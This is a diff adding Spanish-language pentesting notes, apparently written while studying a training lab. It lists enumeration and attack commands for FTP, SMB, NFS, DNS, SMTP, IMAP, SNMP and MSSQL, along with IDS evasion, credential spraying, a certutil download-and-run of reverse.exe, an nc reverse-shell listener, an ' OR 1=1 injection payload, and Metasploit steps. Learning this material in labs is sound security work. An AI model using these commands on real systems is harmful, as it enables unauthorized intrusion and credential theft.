@@ -1,0 +1,233 @@
+===================================
+HERRAMIENTAS
+===================================
+draw.io
+
+===================================
+NMAP (DESCUBRIMIENTO)
+===================================
+
+nmap -sn red --> manda paquetes icmp a toda la red para descubrir equipos
+nmap  -sS -p- --open IP - oN tcp_scan.txt--> Escaneo de todos los puertos de la ip 
+nmap -sSU -p 53 --script dns-nsid IP --> escaneo del puerto tcp y udp 53, estando bloqueado por IDS para ver su flag
+sudo nmap -sS -p- 10.129.2.47 --reason -T5 --source-port 53 -->
+sudo ncat -nv --source-port 53 10.129.2.47 50000
+nmap 10.129.202.5 -sV -sC -p139,445 --> ver version de samba
+
+/usr/share/nmap/scripts/ --> directorio de scripts de NMAP
+
+
+===================================
+NET CAT (ENTRADA A SERVICIOS)
+===================================
+nc -nv 10.129.14.136 21 --> Conectar por FTP
+
+sudo ncat -nv --source-port 53 10.129.2.47 50000 --> Emulamos que hacemos la petición desde el puerto 53 para evasión del IDS y nos conectamos a la ip al puerto 50000
+
+===================================
+FTP (ENTRADA A SERVICIOS)
+===================================
+nmap -sS -p21 --script ftp-anon 10.129.202.5  --> Este script intenta conectarse y listar como anonimo
+wget -m --no-passive ftp://ftpuser:ftpuser@10.129.202.5 --> conectar anonimamente (el usuario se ha sacado con el comando de arriba, la contraseña se ha intuido que era la misma, aunque se puede colocar la que quieras)
+
+ftp IP puerto --> conectar por ftp
+ls -la
+get 
+
+openssl s_client -connect <FQDN/IP>:21 -starttls ftp
+===================================
+ENUMERAR DIRECTORIOS
+===================================
+dirbuster o gobuster Enumeración de directorios (OWASP)
+
+/usr/share/worldlist/dirbuster/directory-list-lowecase-2.3-medium.txt
+
+(ampliar numero de tareas en paralelo)
+
+===================================
+SMB 137,138,139 | 445 CIFS (Para enumerar carpetas compartidas)
+===================================
+nmap 10.129.202.5 -sV -sC -p139,445 --> ver version de samba
+
+smbclient -L -N IP  --> Lista archivos compartidos mediante una null sesion (sin necesidad de credenciales) PERO NO TE DICE SI TIENES O NO PERMISOS POR ESO USAMOS SMBMAP
+smbmap -H IP    --> Equivalente al de arriba
+crackmapexec smb  IP -u '' -p ''  ip  --shares    --> Equivalente al de arriba
+enum4linux IP --> Equivalente al de arriba PERO TE DA MUCHISIMA MÁS INFORMACIÓN
+
+smbclient //ip/recurso -N     --> En el caso de que veamos algun recurso de lectura publico y queramos acceder al mismo con una null sesion
+
+--------------- 
+rpcclient -U "" IP--> Otra forma de conectarse y sacar información y ejecutar los siguientes comandos
+srvinfo  Server information.
+sm Enumerate all domains that are deployed in the network.
+querydominfo  Provides domain, server, and user information of deployed domains.
+netshareenumall  Enumerates all available shares.
+netsharegetinfo <share>  Provides information about a specific share.
+enumdomusers  Enumerates all domain users.
+queryuser <RID>  Provides information about a specific user.
+---------------
+
+samrdump.py IP --> un script para sacar más info
+smbmap -H IP --> Otra herramienta
+enum4linux-ng IP -A --> Otra herramient
+
+crackmapexec smb  ip -u '' -p ''  ip  --shares
+crackmapexec smb  ip -u usuarios.txt -p ''  ip  --shares
+crackmapexec smb  ip -u usuarios.txt -p usuarios.txt  ip  --shares   -> importante ya que hay usuarios que pueden tener su password como usuario
+
+smbclient //ip/recurso -U usuario
+
+dir --> listar directorio
+get fichero --> para traernos el fichero
+mget    --> masive get para traernos todo
+put fichero --> subirfichero
+
+pillar fichero en windows remotamente:
+certutil.exe -f urlcache ip/recurso nombredeficherodesalida
+.\reverse.exe. --> para ejevutar en windows
+
+===================================
+NFS 111 2049
+===================================
+nmap IP -p111,2049 -sV -sC
+nmap --script nfs* IP -sV -p111,2049
+
+showmount -e IP --> ver que NFS tiene compartidos
+
+MONTAR NFS
+mkdir target-NFS
+mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
+FIN MONTAR NFS
+
+===================================
+DNS 53
+===================================
+FQDN es el conjunto de todo por ejemplo ns.loquesea.com (ojo porque si piden el local puede ser 127.0.0.1)
+
+dig soa www.inlanefreight.htb
+
+dig ns inlanefreight.htb @IP --> interrogar por los ns a un servidor dns(IP)
+
+dig CH TXT version.bind IP --> intentar ver version dns
+
+
+dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
+
+
+===================================
+SMTP 25 587
+===================================
+telnet 10.129.14.128 25
+HELO mail1.inlanefreight.htb --> inicializamos
+EHLO mail1 -->
+
+VRFY usuario --> verificamos si existe el usuario
+
+==Como enviar algo===
+telnet 10.129.14.128 25
+
+EHLO inlanefreight.htb
+MAIL FROM: <cry0l1t3@inlanefreight.htb>
+RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure
+DATA
+End data with <CR><LF>.<CR><LF>
+QUIT
+======================
+
+nmap 10.129.14.128 -sC -sV -p25 
+nmap 10.129.14.128 -p25 --script smtp-open-relay -v
+
+smtp-user-enum -M VRFY -U Downloads/footprinting-wordlist.txt -t 10.129.56.106 
+
+
+===================================
+IMAP / POP3 
+===================================
+nmap 10.129.14.128 -sV -p110,143,993,995 -sC
+curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd -V
+
+openssl s_client -connect 10.129.14.128:pop3s
+
+Conectarse:
+openssl s_client -connect 10.129.14.128:imaps
+1 login usuario contraseña
+1 list "" *  --> VER CARPETAS
+1 SELECT NOMBRECARPETA --- 
+1 FETCH IDMENSAJE ALL  ---
+f fetch 1 rfc822
+
+
+===================================
+SNMP UPD 161 162
+===================================
+snmpwalk -v2c -c public IP
+onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt IP
+
+
+===================================
+MYSQL 3306
+===================================
+nmap IP -sV -sC -p3306 --script mysql*
+
+
+===================================
+MSSQL 1433
+===================================
+
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 IP
+
+python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
+select name from sys.databases
+
+
+Metasploid
+
+msfconsole
+set rhosts
+run
+
+===================================
+REVERSE SHELL
+===================================
+
+
+En nuestra maquina
+nc -lvnp 443
+ 
+
+===================================
+MYSQL INYECTION 
+===================================
+‘ OR 1=1;— -    --> USUARIO
+
+sqlmap -r post_request
+
+
+
+revshells.com —> phppentestmonkey —> shell /bin/bash
+
+Metasploid
+
+msfconsole
+set rhosts
+run
+
+1- Entramos en la consola 
+sudo msfconsole
+search nombrevulnerabilidad  #buscar por codvulnerabilidad
+use iddevueltopormetastploid 
+options  # para ver opciones requeridas
+setg RHOST ipmaquinavulnerar
+run #para correr se puede usar tambien el compando exploit
+
+sessions (por si hacemos un ctrl + z para mandar al background la sesion)
+
+search multi/handler  --> para reverse shells en windows
+
+
+WINDOWS
+
+getuid —> ver usuario
+NT AUTORITY\SYSTEM —> USUARIO QUE CORRE LOS SERVICIOS
+shell —> cambiar a una shell normal y corriente
+ipconfig —> ver interfaces
